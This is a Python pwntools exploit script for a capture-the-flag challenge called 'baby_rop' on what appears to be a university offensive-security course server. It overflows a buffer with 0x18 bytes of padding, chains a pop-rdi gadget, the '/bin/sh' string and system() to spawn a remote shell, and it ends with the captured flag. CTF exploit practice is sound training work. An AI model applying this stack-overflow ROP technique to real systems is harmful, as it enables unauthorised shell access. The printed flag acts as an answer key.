from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./baby_rop"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1201
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     set follow-fork-mode parent
#     b main
#     continue
# ''')

e = ELF(CHALLENGE)
r = ROP(CHALLENGE)
chain = [
    r.rdi.address,                  # 1. Address of "pop rdi; ret" gadget - first gadget that will pop the next value into rdi register
    next(e.search(b"/bin/sh")),     # 2. Address of "/bin/sh" string - this will be popped into rdi by the first gadget above
    r.ret.address,                  # 3. Single ret instruction - to ensure stack alignment (required by system call) 
    e.plt.system                    # 4. Address of system() from PLT - will execute system("/bin/sh") since rdi contains /bin/sh
]

print(p.recvuntil(b"> ").decode())
msg = b"A" * 0x18 + b"".join([p64(c) for c in chain])
p.sendline(msg)
log.info(f"Sending message in raw bytes: {msg}")

p.interactive()

# flag{4ll_g4dg3ts_1nclud3d!_66c4bd3b46de74dc}
